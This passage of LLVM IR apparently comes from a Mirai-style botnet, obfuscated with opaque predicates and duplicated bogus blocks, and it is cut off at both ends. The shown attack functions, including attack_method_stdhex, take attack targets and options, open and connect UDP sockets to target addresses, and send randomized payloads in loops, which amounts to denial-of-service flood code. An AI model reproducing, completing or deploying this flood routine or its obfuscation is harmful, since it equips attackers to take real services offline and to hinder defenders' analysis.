  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %304
  %313 = load i32*, i32** %19, align 8
  %314 = load i32, i32* %17, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds i32, i32* %313, i64 %315
  %317 = load i32, i32* %316, align 4
  %318 = load i8*, i8** %30, align 8
  %319 = load i16, i16* %22, align 2
  %320 = zext i16 %319 to i64
  %321 = call i64 @send(i32 %317, i8* %318, i64 %320, i32 16384)
  %322 = load i32, i32* @x.21
  %323 = load i32, i32* @y.22
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %330

; <label>:330:                                    ; preds = %originalBBpart233
  %331 = load i32, i32* %17, align 4
  %332 = add nsw i32 %331, 1
  store i32 %332, i32* %17, align 4
  br label %287

; <label>:333:                                    ; preds = %287
  %334 = load i32, i32* @x.21
  %335 = load i32, i32* @y.22
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %333
  %342 = load i32, i32* @x.21
  %343 = load i32, i32* @y.22
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %286

originalBBalteredBB:                              ; preds = %originalBB, %4
  %350 = alloca i8, align 1
  %351 = alloca %struct.attack_target*, align 8
  %352 = alloca i8, align 1
  %353 = alloca %struct.attack_option*, align 8
  %354 = alloca i32, align 4
  %355 = alloca i8**, align 8
  %356 = alloca i32*, align 8
  %357 = alloca i16, align 2
  %358 = alloca i16, align 2
  %359 = alloca i16, align 2
  %360 = alloca i8, align 1
  %361 = alloca %struct.sockaddr_in, align 4
  %362 = alloca %struct.iphdr*, align 8
  %363 = alloca %struct.udphdr*, align 8
  %364 = alloca i8*, align 8
  %365 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %366 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %367 = alloca i8*, align 8
  store i8 %0, i8* %350, align 1
  store %struct.attack_target* %1, %struct.attack_target** %351, align 8
  store i8 %2, i8* %352, align 1
  store %struct.attack_option* %3, %struct.attack_option** %353, align 8
  %368 = load i8, i8* %350, align 1
  %369 = zext i8 %368 to i64
  %370 = call noalias i8* @calloc(i64 %369, i64 8) #6
  %371 = bitcast i8* %370 to i8**
  store i8** %371, i8*** %355, align 8
  %372 = load i8, i8* %350, align 1
  %373 = zext i8 %372 to i64
  %374 = call noalias i8* @calloc(i64 %373, i64 4) #6
  %375 = bitcast i8* %374 to i32*
  store i32* %375, i32** %356, align 8
  %376 = load i8, i8* %352, align 1
  %377 = load %struct.attack_option*, %struct.attack_option** %353, align 8
  %378 = call i32 @attack_get_opt_int(i8 zeroext %376, %struct.attack_option* %377, i8 zeroext 7, i32 65535)
  %379 = trunc i32 %378 to i16
  store i16 %379, i16* %357, align 2
  %380 = load i8, i8* %352, align 1
  %381 = load %struct.attack_option*, %struct.attack_option** %353, align 8
  %382 = call i32 @attack_get_opt_int(i8 zeroext %380, %struct.attack_option* %381, i8 zeroext 6, i32 65535)
  %383 = trunc i32 %382 to i16
  store i16 %383, i16* %358, align 2
  %384 = load i8, i8* %352, align 1
  %385 = load %struct.attack_option*, %struct.attack_option** %353, align 8
  %386 = call i32 @attack_get_opt_int(i8 zeroext %384, %struct.attack_option* %385, i8 zeroext 0, i32 1458)
  %387 = trunc i32 %386 to i16
  store i16 %387, i16* %359, align 2
  %388 = load i8, i8* %352, align 1
  %389 = load %struct.attack_option*, %struct.attack_option** %353, align 8
  %390 = call i32 @attack_get_opt_int(i8 zeroext %388, %struct.attack_option* %389, i8 zeroext 1, i32 1)
  %391 = trunc i32 %390 to i8
  store i8 %391, i8* %360, align 1
  %392 = bitcast %struct.sockaddr_in* %361 to i8*
  call void @llvm.memset.p0i8.i64(i8* %392, i8 0, i64 16, i32 4, i1 false)
  %393 = load i16, i16* %358, align 2
  %394 = zext i16 %393 to i32
  %395 = icmp eq i32 %394, 65535
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  store i32 0, i32* %17, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  %396 = load i32, i32* %17, align 4
  %397 = load i8, i8* %13, align 1
  %398 = zext i8 %397 to i32
  %399 = icmp slt i32 %396, %398
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %145
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %179
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %205
  %400 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %401 = load i32, i32* %17, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %400, i64 %402
  %404 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %403, i32 0, i32 1
  %405 = load i32, i32* %404, align 4
  %406 = call i32 @ntohl(i32 %405) #7
  %407 = call i32 @rand_next()
  %408 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %409 = load i32, i32* %17, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i32 0, i32 2
  %413 = load i8, i8* %412, align 4
  %414 = zext i8 %413 to i32
  %_ = shl i32 %407, %414
  %415 = lshr i32 %407, %414
  %_19 = shl i32 %406, %415
  %_20 = sub i32 0, %406
  %gen = add i32 %_20, %415
  %_21 = shl i32 %406, %415
  %_22 = sub i32 0, %406
  %gen23 = add i32 %_22, %415
  %416 = add i32 %406, %415
  %417 = call i32 @htonl(i32 %416) #7
  %418 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %419 = load i32, i32* %17, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i64 %420
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %421, i32 0, i32 0
  %423 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %422, i32 0, i32 2
  %424 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %423, i32 0, i32 0
  store i32 %417, i32* %424, align 4
  br label %originalBB18

originalBB27alteredBB:                            ; preds = %originalBB27, %264
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %304
  %425 = load i32*, i32** %19, align 8
  %426 = load i32, i32* %17, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds i32, i32* %425, i64 %427
  %429 = load i32, i32* %428, align 4
  %430 = load i8*, i8** %30, align 8
  %431 = load i16, i16* %22, align 2
  %432 = zext i16 %431 to i64
  %433 = call i64 @send(i32 %429, i8* %430, i64 %432, i32 16384)
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %333
  br label %originalBB35
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare void @rand_str(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.23
  %6 = load i32, i32* @y.24
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8**, align 8
  %19 = alloca i32*, align 8
  %20 = alloca i16, align 2
  %21 = alloca i16, align 2
  %22 = alloca i16, align 2
  %23 = alloca i8, align 1
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca [256 x i8*], align 16
  %28 = alloca i8*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %31 = alloca i8*, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %32 = load i8, i8* %13, align 1
  %33 = zext i8 %32 to i64
  %34 = call noalias i8* @calloc(i64 %33, i64 8) #6
  %35 = bitcast i8* %34 to i8**
  store i8** %35, i8*** %18, align 8
  %36 = load i8, i8* %13, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 4) #6
  %39 = bitcast i8* %38 to i32*
  store i32* %39, i32** %19, align 8
  %40 = load i8, i8* %15, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 7, i32 65535)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %20, align 2
  %44 = load i8, i8* %15, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 6, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %21, align 2
  %48 = load i8, i8* %15, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 0, i32 1458)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %22, align 2
  %52 = load i8, i8* %15, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 1, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %23, align 1
  %56 = bitcast %struct.sockaddr_in* %24 to i8*
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 16, i32 4, i1 false)
  %57 = load i16, i16* %21, align 2
  %58 = zext i16 %57 to i32
  %59 = icmp eq i32 %58, 65535
  %60 = load i32, i32* @x.23
  %61 = load i32, i32* @y.24
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %59, label %68, label %71

; <label>:68:                                     ; preds = %originalBBpart2
  %69 = call i32 @rand_next()
  %70 = trunc i32 %69 to i16
  store i16 %70, i16* %21, align 2
  br label %90

; <label>:71:                                     ; preds = %originalBBpart2
  %72 = load i32, i32* @x.23
  %73 = load i32, i32* @y.24
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %71
  %80 = load i16, i16* %21, align 2
  %81 = call zeroext i16 @htons(i16 zeroext %80) #7
  store i16 %81, i16* %21, align 2
  %82 = load i32, i32* @x.23
  %83 = load i32, i32* @y.24
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %90

; <label>:90:                                     ; preds = %originalBBpart24, %68
  store i32 0, i32* %17, align 4
  br label %91

; <label>:91:                                     ; preds = %originalBBpart250, %90
  %92 = load i32, i32* %17, align 4
  %93 = load i8, i8* %13, align 1
  %94 = zext i8 %93 to i32
  %95 = icmp slt i32 %92, %94
  br i1 %95, label %96, label %292

; <label>:96:                                     ; preds = %91
  %97 = load i32, i32* @x.23
  %98 = load i32, i32* @y.24
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %96
  %105 = bitcast [256 x i8*]* %27 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %105, i8* bitcast ([256 x i8*]* @attack_method_stdhex.satuur_thicc to i8*), i64 2048, i32 16, i1 false)
  %106 = call i32 @rand() #6
  %107 = srem i32 %106, 256
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [256 x i8*], [256 x i8*]* %27, i64 0, i64 %108
  %110 = load i8*, i8** %109, align 8
  store i8* %110, i8** %28, align 8
  %111 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %112 = load i8**, i8*** %18, align 8
  %113 = load i32, i32* %17, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8*, i8** %112, i64 %114
  store i8* %111, i8** %115, align 8
  %116 = load i16, i16* %20, align 2
  %117 = zext i16 %116 to i32
  %118 = icmp eq i32 %117, 65535
  %119 = load i32, i32* @x.23
  %120 = load i32, i32* @y.24
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br i1 %118, label %127, label %136

; <label>:127:                                    ; preds = %originalBBpart214
  %128 = call i32 @rand_next()
  %129 = trunc i32 %128 to i16
  %130 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %131 = load i32, i32* %17, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i64 %132
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i32 0, i32 0
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %134, i32 0, i32 1
  store i16 %129, i16* %135, align 2
  br label %161

; <label>:136:                                    ; preds = %originalBBpart214
  %137 = load i32, i32* @x.23
  %138 = load i32, i32* @y.24
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %136
  %145 = load i16, i16* %20, align 2
  %146 = call zeroext i16 @htons(i16 zeroext %145) #7
  %147 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %148 = load i32, i32* %17, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 1
  store i16 %146, i16* %152, align 2
  %153 = load i32, i32* @x.23
  %154 = load i32, i32* @y.24
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %161

; <label>:161:                                    ; preds = %originalBBpart218, %127
  %162 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %163 = load i32*, i32** %19, align 8
  %164 = load i32, i32* %17, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i32, i32* %163, i64 %165
  store i32 %162, i32* %166, align 4
  %167 = icmp eq i32 %162, -1
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %161
  ret void

; <label>:169:                                    ; preds = %161
  %170 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %170, align 4
  %171 = load i16, i16* %21, align 2
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %171, i16* %172, align 2
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 0, i32* %174, align 4
  %175 = load i32*, i32** %19, align 8
  %176 = load i32, i32* %17, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds i32, i32* %175, i64 %177
  %179 = load i32, i32* %178, align 4
  %180 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %181 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  store %struct.sockaddr* %181, %struct.sockaddr** %180, align 8
  %182 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %183 = load %struct.sockaddr*, %struct.sockaddr** %182, align 8
  %184 = call i32 @bind(i32 %179, %struct.sockaddr* %183, i32 16) #6
  %185 = icmp eq i32 %184, -1
  br i1 %185, label %186, label %187

; <label>:186:                                    ; preds = %169
  br label %187

; <label>:187:                                    ; preds = %186, %169
  %188 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %189 = load i32, i32* %17, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i32 0, i32 2
  %193 = load i8, i8* %192, align 4
  %194 = zext i8 %193 to i32
  %195 = icmp slt i32 %194, 32
  br i1 %195, label %196, label %238

; <label>:196:                                    ; preds = %187
  %197 = load i32, i32* @x.23
  %198 = load i32, i32* @y.24
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %196
  %205 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %206 = load i32, i32* %17, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 1
  %210 = load i32, i32* %209, align 4
  %211 = call i32 @ntohl(i32 %210) #7
  %212 = call i32 @rand_next()
  %213 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %214 = load i32, i32* %17, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i64 %215
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i32 0, i32 2
  %218 = load i8, i8* %217, align 4
  %219 = zext i8 %218 to i32
  %220 = lshr i32 %212, %219
  %221 = add i32 %211, %220
  %222 = call i32 @htonl(i32 %221) #7
  %223 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %224 = load i32, i32* %17, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i32 0, i32 0
  %228 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %227, i32 0, i32 2
  %229 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %228, i32 0, i32 0
  store i32 %222, i32* %229, align 4
  %230 = load i32, i32* @x.23
  %231 = load i32, i32* @y.24
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart240, label %originalBB20alteredBB

originalBBpart240:                                ; preds = %originalBB20
  br label %238

; <label>:238:                                    ; preds = %originalBBpart240, %187
  %239 = load i32, i32* @x.23
  %240 = load i32, i32* @y.24
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %238
  %247 = load i32*, i32** %19, align 8
  %248 = load i32, i32* %17, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds i32, i32* %247, i64 %249
  %251 = load i32, i32* %250, align 4
  %252 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %253 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %254 = load i32, i32* %17, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %253, i64 %255
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %256, i32 0, i32 0
  %258 = bitcast %struct.sockaddr_in* %257 to %struct.sockaddr*
  store %struct.sockaddr* %258, %struct.sockaddr** %252, align 8
  %259 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %260 = load %struct.sockaddr*, %struct.sockaddr** %259, align 8
  %261 = call i32 @connect(i32 %251, %struct.sockaddr* %260, i32 16)
  %262 = icmp eq i32 %261, -1
  %263 = load i32, i32* @x.23
  %264 = load i32, i32* @y.24
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %262, label %271, label %272

; <label>:271:                                    ; preds = %originalBBpart244
  br label %272

; <label>:272:                                    ; preds = %271, %originalBBpart244
  br label %273

; <label>:273:                                    ; preds = %272
  %274 = load i32, i32* @x.23
  %275 = load i32, i32* @y.24
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %273
  %282 = load i32, i32* %17, align 4
  %283 = add nsw i32 %282, 1
  store i32 %283, i32* %17, align 4
  %284 = load i32, i32* @x.23
  %285 = load i32, i32* @y.24
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart250, label %originalBB46alteredBB

originalBBpart250:                                ; preds = %originalBB46
  br label %91

; <label>:292:                                    ; preds = %91
  br label %293

; <label>:293:                                    ; preds = %originalBBpart254, %292
  store i32 0, i32* %17, align 4
  br label %294

; <label>:294:                                    ; preds = %321, %293
  %295 = load i32, i32* %17, align 4
  %296 = load i8, i8* %13, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  br i1 %298, label %299, label %324

; <label>:299:                                    ; preds = %294
  %300 = load i8**, i8*** %18, align 8
  %301 = load i32, i32* %17, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds i8*, i8** %300, i64 %302
  %304 = load i8*, i8** %303, align 8
  store i8* %304, i8** %31, align 8
  %305 = load i8, i8* %23, align 1
  %306 = icmp ne i8 %305, 0
  br i1 %306, label %307, label %311

; <label>:307:                                    ; preds = %299
  %308 = load i8*, i8** %31, align 8
  %309 = load i16, i16* %22, align 2
  %310 = zext i16 %309 to i32
  call void @rand_str(i8* %308, i32 %310)
  br label %311

; <label>:311:                                    ; preds = %307, %299
  %312 = load i32*, i32** %19, align 8
  %313 = load i32, i32* %17, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds i32, i32* %312, i64 %314
  %316 = load i32, i32* %315, align 4
  %317 = load i8*, i8** %31, align 8
  %318 = load i16, i16* %22, align 2
  %319 = zext i16 %318 to i64
  %320 = call i64 @send(i32 %316, i8* %317, i64 %319, i32 16384)
  br label %321

; <label>:321:                                    ; preds = %311
  %322 = load i32, i32* %17, align 4
  %323 = add nsw i32 %322, 1
  store i32 %323, i32* %17, align 4
  br label %294

; <label>:324:                                    ; preds = %294
  %325 = load i32, i32* @x.23
  %326 = load i32, i32* @y.24
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %324
  %333 = load i32, i32* @x.23
  %334 = load i32, i32* @y.24
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %293

originalBBalteredBB:                              ; preds = %originalBB, %4
  %341 = alloca i8, align 1
  %342 = alloca %struct.attack_target*, align 8
  %343 = alloca i8, align 1
  %344 = alloca %struct.attack_option*, align 8
  %345 = alloca i32, align 4
  %346 = alloca i8**, align 8
  %347 = alloca i32*, align 8
  %348 = alloca i16, align 2
  %349 = alloca i16, align 2
  %350 = alloca i16, align 2
  %351 = alloca i8, align 1
  %352 = alloca %struct.sockaddr_in, align 4
  %353 = alloca %struct.iphdr*, align 8
  %354 = alloca %struct.udphdr*, align 8
  %355 = alloca [256 x i8*], align 16
  %356 = alloca i8*, align 8
  %357 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %358 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %359 = alloca i8*, align 8
  store i8 %0, i8* %341, align 1
  store %struct.attack_target* %1, %struct.attack_target** %342, align 8
  store i8 %2, i8* %343, align 1
  store %struct.attack_option* %3, %struct.attack_option** %344, align 8
  %360 = load i8, i8* %341, align 1
  %361 = zext i8 %360 to i64
  %362 = call noalias i8* @calloc(i64 %361, i64 8) #6
  %363 = bitcast i8* %362 to i8**
  store i8** %363, i8*** %346, align 8
  %364 = load i8, i8* %341, align 1
  %365 = zext i8 %364 to i64
  %366 = call noalias i8* @calloc(i64 %365, i64 4) #6
  %367 = bitcast i8* %366 to i32*
  store i32* %367, i32** %347, align 8
  %368 = load i8, i8* %343, align 1
  %369 = load %struct.attack_option*, %struct.attack_option** %344, align 8
  %370 = call i32 @attack_get_opt_int(i8 zeroext %368, %struct.attack_option* %369, i8 zeroext 7, i32 65535)
  %371 = trunc i32 %370 to i16
  store i16 %371, i16* %348, align 2
  %372 = load i8, i8* %343, align 1
  %373 = load %struct.attack_option*, %struct.attack_option** %344, align 8
  %374 = call i32 @attack_get_opt_int(i8 zeroext %372, %struct.attack_option* %373, i8 zeroext 6, i32 65535)
  %375 = trunc i32 %374 to i16
  store i16 %375, i16* %349, align 2
  %376 = load i8, i8* %343, align 1
  %377 = load %struct.attack_option*, %struct.attack_option** %344, align 8
  %378 = call i32 @attack_get_opt_int(i8 zeroext %376, %struct.attack_option* %377, i8 zeroext 0, i32 1458)
  %379 = trunc i32 %378 to i16
  store i16 %379, i16* %350, align 2
  %380 = load i8, i8* %343, align 1
  %381 = load %struct.attack_option*, %struct.attack_option** %344, align 8
  %382 = call i32 @attack_get_opt_int(i8 zeroext %380, %struct.attack_option* %381, i8 zeroext 1, i32 1)
  %383 = trunc i32 %382 to i8
  store i8 %383, i8* %351, align 1
  %384 = bitcast %struct.sockaddr_in* %352 to i8*
  call void @llvm.memset.p0i8.i64(i8* %384, i8 0, i64 16, i32 4, i1 false)
  %385 = load i16, i16* %349, align 2
  %386 = zext i16 %385 to i32
  %387 = icmp eq i32 %386, 65535
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %71
  %388 = load i16, i16* %21, align 2
  %389 = call zeroext i16 @htons(i16 zeroext %388) #7
  store i16 %389, i16* %21, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %96
  %390 = bitcast [256 x i8*]* %27 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %390, i8* bitcast ([256 x i8*]* @attack_method_stdhex.satuur_thicc to i8*), i64 2048, i32 16, i1 false)
  %391 = call i32 @rand() #6
  %_ = sub i32 %391, 256
  %gen = mul i32 %_, 256
  %_7 = sub i32 0, %391
  %gen8 = add i32 %_7, 256
